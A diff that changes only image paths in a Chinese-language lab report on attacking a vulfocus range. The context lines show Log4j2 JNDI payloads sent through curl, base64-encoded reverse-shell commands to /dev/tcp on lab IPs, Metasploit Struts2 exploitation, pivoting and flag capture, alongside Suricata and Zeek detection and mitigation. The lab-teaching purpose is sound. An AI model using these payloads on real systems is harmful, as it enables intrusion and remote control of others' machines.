@@ -104,37 +104,37 @@ sudo systemctl restart docker
 
 --
 
-![](../img/DaleChu/install_docker.png)
+![](/imgs/DaleChu/install_docker.png)
 
 查看 git 和 docker 版本 :
 
-![](../img/DaleChu/git_docker_v.png)
+![](/imgs/DaleChu/git_docker_v.png)
 
 
 --
 
 参考 [小陈的容器镜像站](https://mp.weixin.qq.com/s/jaUb7sSLDBXrU3F7crtWPA)  配置 docker 镜像源 :
 
-![](../img/DaleChu/docker_config.png)
+![](/imgs/DaleChu/docker_config.png)
 
 使用命令 `git clone https://github.com/c4pr1c3/ctf-games.git` 克隆 ctf-games 仓库 :
 
-![](../img/DaleChu/git_clone_ctf-games.png)
+![](/imgs/DaleChu/git_clone_ctf-games.png)
 
 
 --
 
 拉取 docker 镜像 vulfocus :
 
-![](../img/DaleChu/docker_pull_vulfocus.png)
+![](/imgs/DaleChu/docker_pull_vulfocus.png)
 
 切换到 ctf-games/fofapro/vulfocus 目录下, 执行 `bash start.sh`, 选择 host-only 网卡对应的 IP 地址 :
 
-![](../img/DaleChu/start_sh.png)
+![](/imgs/DaleChu/start_sh.png)
 
 在宿主机浏览器上访问此 IP 地址, 默认用户名和口令均为 admin : 
 
-![](../img/DaleChu/dashboard.png)
+![](/imgs/DaleChu/dashboard.png)
 
 ---
 
@@ -175,17 +175,17 @@ sudo systemctl restart docker
 
 下载 Log4j2 镜像并启动漏洞靶标 :
 
-![](../img/DaleChu/log4j2.png)
+![](/imgs/DaleChu/log4j2.png)
 
 尝试在 URL 后补充 '/hell' 和 '/hello' :
 
-![](../img/DaleChu/hell.png)
+![](/imgs/DaleChu/hell.png)
 
-![](../img/DaleChu/hello.png)
+![](/imgs/DaleChu/hello.png)
 
 在 kali 中执行 `docker ps` 查看正在运行的容器 :
 
-![](../img/DaleChu/eloquent_boyd.png)
+![](/imgs/DaleChu/eloquent_boyd.png)
 
 Log4j2 对应的容器名称为 eloquent_boyd
 
@@ -197,7 +197,7 @@ docker exec -it eloquent_boyd bash
 
 --
 
-![](../img/DaleChu/enter_ctn.png)
+![](/imgs/DaleChu/enter_ctn.png)
 
 发现 demo.jar 文件, 将其拷贝出来 :
 
@@ -207,11 +207,11 @@ docker cp eloquent_boyd:/demo/demo.jar ./
 
 --
 
-![](../img/DaleChu/demojar.png)
+![](/imgs/DaleChu/demojar.png)
 
 使用 `jd-gui` 工具反编译, 查看代码 :
 
-![](../img/DaleChu/javade.png)
+![](/imgs/DaleChu/javade.png)
 
 确实发现漏洞.
 
@@ -236,8 +236,8 @@ docker exec -it {container_name} /bin/bash
 
 --
 
-![](../img/Dracuspicy/7.png)
-![](../img/Dracuspicy/8.png)
+![](/imgs/Dracuspicy/7.png)
+![](/imgs/Dracuspicy/8.png)
 
 ---
 
@@ -245,9 +245,9 @@ docker exec -it {container_name} /bin/bash
 
 --
 
-![](../img/Dracuspicy/9.png)
+![](/imgs/Dracuspicy/9.png)
 
-![](../img/Dracuspicy/78.png)
+![](/imgs/Dracuspicy/78.png)
 
 --
 
@@ -300,7 +300,7 @@ public class Log4j2RceApplication {
 
 根据[教学视频](https://www.bilibili.com/video/BV1p3411x7da/?p=18&spm_id_from=pageDriver&vd_source=29be36c5871bf765d00681706f529585)中所讲代码中出现漏洞问题是在`logger.error,logger.info`函数中，但并没讲述原因
 
-![](../img/Dracuspicy/79.png)
+![](/imgs/Dracuspicy/79.png)
 
 --
 
@@ -344,7 +344,7 @@ Log4j2在记录日志时会解析`${}`中的内容。在这种情况下，它会
 
 打开网站 http://www.dnslog.cn/ , 获取随机子域名 `95p55c.dnslog.cn` :
 
-![](../img/DaleChu/95p55c.png)
+![](/imgs/DaleChu/95p55c.png)
 
 根据靶场容器 URL 和获取的子域名，对 payload 字段进行编码, 编码平台可使用 https://www.urlencoder.org/ .
 
@@ -362,7 +362,7 @@ curl "http://192.168.5.132:50721/hello?payload=%24%7Bjndi%3Aldap%3A%2F%2F95p55c.
 
 发现四条解析记录，说明漏洞可利用 : 
 
-![](../img/DaleChu/curl.png)
+![](/imgs/DaleChu/curl.png)
 
 一开始做的时候根据老师视频演示的代码来做发现运行不了的问题，然后我们查看根据反编译结果发现，缺陷函数用到的是 get 请求方法，所以该环境不能支持 post ,所以我们得换成发送 get 请求
 
@@ -393,13 +393,13 @@ python log4j-scan.py --request-type get -u http://192.168.5.132:49576/hello --dn
 
 --
 
-![](../img/DaleChu/pipreq.png)
+![](/imgs/DaleChu/pipreq.png)
 
-![](../img/DaleChu/add_payload.png)
+![](/imgs/DaleChu/add_payload.png)
 
-![](../img/DaleChu/v_to_payload.png)
+![](/imgs/DaleChu/v_to_payload.png)
 
-![](../img/DaleChu/get_it.png)
+![](/imgs/DaleChu/get_it.png)
 
 成功扫描到漏洞 !
 
@@ -413,7 +413,7 @@ python log4j-scan.py --request-type get -u http://192.168.5.132:49576/hello --dn
 
 (2). curl POST 请求不允许 : 按照原教程，使用 `curl -X POST` 发送请求，但是返回 `405 Method Not Allowed` 错误。
 
-![error_3](../img/lihan3238_doc/error_3.png)
+![error_3](/imgs/lihan3238_doc/error_3.png)
 
 - 原因：靶场容器似乎不允许 POST 请求，只能使用 GET 请求
 - 解决：本质上是发送一个包含关键词的 HTTP 请求，可以使用 GET 请求替代 `curl "http://192.168.4.129:26678/hello?payload=%24%7Bjndi%3Aldap%3A%2F%2Fxco6xt.dnslog.cn%2Flihan3238%7D"`
@@ -449,7 +449,7 @@ hostnamectl set-hostname attacker
 
 --
 
-![](../img/DaleChu/rename_attacker.png)
+![](/imgs/DaleChu/rename_attacker.png)
 
 在虚拟机 attacker 上安装 tmux 和 asciinema :
 
@@ -534,7 +534,7 @@ bash -i >& /dev/tcp/192.168.5.134/7777 0>&1
 
 在 attacker 虚拟机中下载 [JNDIExploit.v1.2.zip](https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2), 解压缩, 计算校验和 :
 
-![](../img/DaleChu/jndi_jar.png)
+![](/imgs/DaleChu/jndi_jar.png)
 
 尝试反弹 Shell : 
 
@@ -562,7 +562,7 @@ SHELL_COMMAND="bash -i >& /dev/tcp/192.168.5.134/7777 0>&1" && BASE64_PAYLOAD=$(
 
 flag 即为 : **flag-{bmh95894fd4-c71c-4ad5-b1eb-83b886126dcf}**
 
-![](../img/DaleChu/jndi_atk.png)
+![](/imgs/DaleChu/jndi_atk.png)
 
 --
 
@@ -581,7 +581,7 @@ asciinema 录屏 :
 原先的 `curl http://192.168.182.129:43381/hello -d 'payload=${jndi:ldap://192.168.182.130:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.182.130/7777 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')'}' ` 命令执行失败 : 
 
 
-![method_not_allowed_1](../img/lihan3238_doc/method_not_allowed_1.png)
+![method_not_allowed_1](/imgs/lihan3238_doc/method_not_allowed_1.png)
 
 注意到这里又出现了 POST 请求不允许的情况，根据昨天的经验，使用 GET 请求替代：
 
@@ -663,9 +663,9 @@ docker exec -it suricata tail -f /var/log/suricata/fast.log
 
 ```
 
-![](../img/DaleChu/suricata_run.png)
+![](/imgs/DaleChu/suricata_run.png)
 
-![](../img/DaleChu/suricata_f.png)
+![](/imgs/DaleChu/suricata_f.png)
 
 --
 
@@ -682,7 +682,7 @@ asciinema 录屏 :
 这张图表展示了Log4j JNDI攻击的原理和防御方法：
 
 
-![log4j2_4](../img/lihan3238_doc/log4j2_4.png)
+![log4j2_4](/imgs/lihan3238_doc/log4j2_4.png)
 
 --
 
@@ -718,7 +718,7 @@ asciinema 录屏 :
 
 - 我们找到BOOT-INF/classes/com.example.log4j2_rce
 
-![](../img/Dracuspicy/82.png)
+![](/imgs/Dracuspicy/82.png)
 
 ---
 
@@ -769,7 +769,7 @@ log4j2还定义了一个内置的标准级别`intLevel`，由数值表示，级�
 
 而在我进行dnslog测试的时候发现
 
-![](../img/Dracuspicy/83.png)
+![](/imgs/Dracuspicy/83.png)
 
 有两条返回值，说明`logger.info`函数也执行了（'info'>'error'）。也就说明默认等级是`info`
 
@@ -778,7 +778,7 @@ log4j2还定义了一个内置的标准级别`intLevel`，由数值表示，级�
 在我对代码进一步研究的时候，我发现一个名叫`LowLevelLogUtill.class`
 的文件
 
-![](../img/Dracuspicy/84.png)
+![](/imgs/Dracuspicy/84.png)
 
 文件注释中解释了这段代码的作用 ，他将低等级的代码用另一种方式简单记录下来
 
@@ -813,7 +813,7 @@ log4j2还定义了一个内置的标准级别`intLevel`，由数值表示，级�
 
 --
 
-![](../img/Dracuspicy/85.png)
+![](/imgs/Dracuspicy/85.png)
 
 在主机上编译又有许多报错，我猜测可能是版本问题
 
@@ -823,7 +823,7 @@ log4j2还定义了一个内置的标准级别`intLevel`，由数值表示，级�
 
 - 在我对代码的寻找中找到了`JNDIlookup.class`
 
-![](../img/Dracuspicy/86.png)
+![](/imgs/Dracuspicy/86.png)
 
 简单粗暴，我一层一层的解压找到class文件直接删除，然后放到docker容器里面替换demo.jar运行出现报错
 
@@ -871,7 +871,7 @@ export JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"
 
 - 修改jvm参数执行demo.jar发现攻击失败并且流量检测检测到了攻击，该方法是唯一一次成功缓解攻击的
 
-![](../img/Dracuspicy/87.png)
+![](/imgs/Dracuspicy/87.png)
 
 ---
 
@@ -891,13 +891,13 @@ export JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"
 - 发布成功后，通过左侧导航菜单里的 场景 找到刚才发布成功的场景缩略图，点击后进入场景详情页面，点击 启动场景 。
 - 注意访问地址不是场景详情页面上显示的，请自行替换为 vulfocus管理页面的访问IP:场景详情页面上显示的端口号 。
 
-![](../img/DaleChu/dmz_714.png)
+![](/imgs/DaleChu/dmz_714.png)
 
-![graph_1](../img/lihan3238_doc/graph_1.png)
+![graph_1](/imgs/lihan3238_doc/graph_1.png)
 
 --
 
-![](../img/DaleChu/dps_714.png)
+![](/imgs/DaleChu/dps_714.png)
 
 这里发现镜像 `vulfocus/struts2-cve_2020_17530` 对应容器的 CONTAINER ID 为 `12499e844404`, 下面尝试捕获指定容器的上下行流量 :
 
@@ -911,9 +911,9 @@ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_
 
 --
 
-![](../img/DaleChu/tmux_cd.png)
+![](/imgs/DaleChu/tmux_cd.png)
 
-![](../img/DaleChu/id_714.png)
+![](/imgs/DaleChu/id_714.png)
 
 --
 
@@ -921,7 +921,7 @@ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_
 
 部署 DMZ 场景, 一直失败. 请教老师后, 发现我的两位室友也都遇到了同样的问题哈哈, 需要自己写一个 dockerfile, 将 vulshare/nginx-php-flag 容器中的 /2.sh 的  `ping aa.25qcpp.dnslog.cn` 命令删去即可 ( 因为无法 ping 通 ). 但是当我回到宿舍中, 还没动手修改, 却发现此能跑通了 ! 即宿舍网环境中能正常 ping 此域名 : 
 
-![](../img/DaleChu/ping_ok.png)
+![](/imgs/DaleChu/ping_ok.png)
 
 ---
 
@@ -951,9 +951,9 @@ workspace -l
 
 原先的 attacker 虚拟机运行 msfconsole 命令报错了, 查阅诸多方法无法解决, 遂使用新虚拟机作为 attacker 了 : 
 
-![](../img/DaleChu/new_atk.png)
+![](/imgs/DaleChu/new_atk.png)
 
-![](../img/DaleChu/pg_demo.png)
+![](/imgs/DaleChu/pg_demo.png)
 
 --
 
@@ -975,9 +975,9 @@ use <编号>
 
 --
 
-![](../img/DaleChu/search_struc.png)
+![](/imgs/DaleChu/search_struc.png)
 
-![](../img/DaleChu/exp_use.png)
+![](/imgs/DaleChu/exp_use.png)
 
 
 ```shell
@@ -988,7 +988,7 @@ show payloads
 set payload payload/cmd/unix/reverse_bash
 ```
 
-![](../img/DaleChu/set_payload.png)
+![](/imgs/DaleChu/set_payload.png)
 
 --
 
@@ -1008,7 +1008,7 @@ set LHOST  192.168.5.135
 show options
 ```
 
-![](../img/DaleChu/set_hosts.png)
+![](/imgs/DaleChu/set_hosts.png)
 
 
 ```shell
@@ -1033,9 +1033,9 @@ ls /tmp
 
 发现 **flag-{bmh5385b98e-4e60-4423-8c7f-6d01adb1b517}** !
 
-![](../img/DaleChu/first_flag.png)
+![](/imgs/DaleChu/first_flag.png)
 
-![](../img/DaleChu/flag_suc1.png)
+![](/imgs/DaleChu/flag_suc1.png)
 
 --
 
@@ -1063,7 +1063,7 @@ sessions l
 sessons -i 2
 ```
 
-![](../img/DaleChu/sss_715.png)
+![](/imgs/DaleChu/sss_715.png)
 
 --
 
@@ -1080,9 +1080,9 @@ route
 arp
 ```
 
-![](../img/DaleChu/if_715.png)
+![](/imgs/DaleChu/if_715.png)
 
-![](../img/DaleChu/ra_715.png)
+![](/imgs/DaleChu/ra_715.png)
 
 --
 
@@ -1097,7 +1097,7 @@ run autoroute -p
 
 ```
 
-![](../img/DaleChu/rasp.png)
+![](/imgs/DaleChu/rasp.png)
 
 --
 
@@ -1122,11 +1122,11 @@ hosts
 
 --
 
-![](../img/DaleChu/portscan.png)
+![](/imgs/DaleChu/portscan.png)
 
-![](../img/DaleChu/runj.png)
+![](/imgs/DaleChu/runj.png)
 
-![](../img/DaleChu/new_hosts.png)
+![](/imgs/DaleChu/new_hosts.png)
 
 --
 
@@ -1144,9 +1144,9 @@ run -j
 jobs -v
 ```
 
-![](../img/DaleChu/ssu.png)
+![](/imgs/DaleChu/ssu.png)
 
-![](../img/DaleChu/runjjobsv.png)
+![](/imgs/DaleChu/runjjobsv.png)
 
 --
 
@@ -1162,7 +1162,7 @@ sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/pr
 proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.175.84.2-5
 ```
 
-![](../img/DaleChu/neo_tmn.png)
+![](/imgs/DaleChu/neo_tmn.png)
 
 --
 
@@ -1180,9 +1180,9 @@ curl http://192.175.84.5:7001 -vv
 
 ```
 
-![](../img/DaleChu/neo_sl.png)
+![](/imgs/DaleChu/neo_sl.png)
 
-![](../img/DaleChu/404_nf.png)
+![](/imgs/DaleChu/404_nf.png)
 
 --
 
@@ -1222,19 +1222,19 @@ sessions -c "ls /tmp" -i 3,4,5
 
 --
 
-![](../img/DaleChu/neo_cve.png)
+![](/imgs/DaleChu/neo_cve.png)
 
-![](../img/DaleChu/init_3.png)
+![](/imgs/DaleChu/init_3.png)
 
-![](../img/DaleChu/init_5.png)
+![](/imgs/DaleChu/init_5.png)
 
 --
 
 来看最终输出结果吧 ! 
 
-![](../img/DaleChu/so_many_flags.png)
+![](/imgs/DaleChu/so_many_flags.png)
 
-![](../img/DaleChu/yeahhhh.png)
+![](/imgs/DaleChu/yeahhhh.png)
 
 --
 
@@ -1269,15 +1269,15 @@ run autoroute -p
 
 --
 
-![](../img/DaleChu/s3i.png)
+![](/imgs/DaleChu/s3i.png)
 
-![](../img/DaleChu/s4i.png)
+![](/imgs/DaleChu/s4i.png)
 
-![](../img/DaleChu/s5i.png)
+![](/imgs/DaleChu/s5i.png)
 
-![](../img/DaleChu/5_2_6.png)
+![](/imgs/DaleChu/5_2_6.png)
 
-![](../img/DaleChu/rt2.png)
+![](/imgs/DaleChu/rt2.png)
 
 --
 
@@ -1308,9 +1308,9 @@ sessions -i 6
 --
 
 
-![](../img/DaleChu/till_run.png)
+![](/imgs/DaleChu/till_run.png)
 
-![](../img/DaleChu/services_hosts.png)
+![](/imgs/DaleChu/services_hosts.png)
 
 注意到这里开放了 80 端口的 ip 是 **192.176.85.3** !
 
@@ -1326,15 +1326,15 @@ sessions -c "wget 'http://192.176.85.3/index.php?cmd=ls /tmp' -O /tmp/result && 
 
 ```
 
-![](../img/DaleChu/l_1.png)
+![](/imgs/DaleChu/l_1.png)
 
-![](../img/DaleChu/finish_it.png)
+![](/imgs/DaleChu/finish_it.png)
 
 --
 
 发现 **flag-{bmh516b6e99-fcae-4f36-9beb-e6a1d37d58e0}** !
 
-![](../img/DaleChu/last_flag_get.png)
+![](/imgs/DaleChu/last_flag_get.png)
 
 DMZ 场景五面 flag 全部找到 ! 初步完成实验 ! 
 
@@ -1354,7 +1354,7 @@ asciinema 录屏 :
 
 nginx-php-flag 镜像的容器启动失败 : 
 
-![error_4_1](../img/lihan3238_doc/error_4_1.png)
+![error_4_1](/imgs/lihan3238_doc/error_4_1.png)
 
 - 原因：查看容器日志发现有失败的 ping 的记录；
 进而进入容器查看，发现有一个 2.sh 的文件中包含 `ping aa.25qcpp.dnslog.cn`,实际上 ping 不通；
@@ -1382,7 +1382,7 @@ docker build -t vulshare/nginx-php-flag:latest .
 # 重新启动场景
 ```
 
-![error_4_2](../img/lihan3238_doc/error_4_2.png)
+![error_4_2](/imgs/lihan3238_doc/error_4_2.png)
 
 ---
 
@@ -1398,7 +1398,7 @@ docker build -t vulshare/nginx-php-flag:latest .
 
 1. 提取抓取的流量文件 [**tcpdump.pcap**](../code/lihan_code/tcpdump/tcpdump.pcap), 使用 `wireshark` 分析流量
 
-![tcpdump_2](../img/lihan3238_doc/tcpdump_2.png)
+![tcpdump_2](/imgs/lihan3238_doc/tcpdump_2.png)
 
 --
 
@@ -1419,7 +1419,7 @@ zeek -r tcpdump.pcap /usr/local/zeek/share/zeek/site/local.zeek
 zeek -r ./tcpdump/[]/tcpdump.pcap
 ```
 
-![zeek_1](../img/lihan3238_doc/zeek_1.png)
+![zeek_1](/imgs/lihan3238_doc/zeek_1.png)
 
 ---
 
@@ -1437,7 +1437,7 @@ elsif cve == 'CVE-2020-17530'
 ```
 使用 `urlencoded-form.value contains "%{"` 进行过滤 成功找到攻击流量
 
-![wireshark_1](../img/lihan3238_doc/wireshark_1.png)
+![wireshark_1](/imgs/lihan3238_doc/wireshark_1.png)
 
 --
 
@@ -1445,7 +1445,7 @@ elsif cve == 'CVE-2020-17530'
 
 在 `http.log` 文件中找到 `POST` 请求 `cat http.log | grep 'POST'`
 
-![zeek_2.1](../img/lihan3238_doc/zeek_2.1.png)
+![zeek_2.1](/imgs/lihan3238_doc/zeek_2.1.png)
 
 根据 `数据包大小` `目标 IP` 等信息，检查可疑流量
 
@@ -1485,7 +1485,7 @@ when 'Unix', 'Solaris'
 ```
 使用 `xml.cdata contains "/bin/bash"` 进行过滤 成功找到攻击流量
 
-![wireshark_2](../img/lihan3238_doc/wireshark_2.png)
+![wireshark_2](/imgs/lihan3238_doc/wireshark_2.png)
 
 --
 
@@ -1493,7 +1493,7 @@ when 'Unix', 'Solaris'
 
 在 `http.log` 文件中找到 `POST` 请求 `cat http.log | grep 'POST'`
 
-![zeek_2.2](../img/lihan3238_doc/zeek_2.2.png)
+![zeek_2.2](/imgs/lihan3238_doc/zeek_2.2.png)
 
 根据 `数据包大小` `目标 IP` 等信息，检查可疑流量
 
@@ -1603,7 +1603,7 @@ sudo docker run --rm --net=container:${container_id} -v ${PWD}/tcpdump/${contain
 
 有失败的攻击流量，但没有成功，说明漏洞已缓解
 
-![evidence](../img/lihan3238_doc/evidence.png)
+![evidence](/imgs/lihan3238_doc/evidence.png)
 
 ---
 
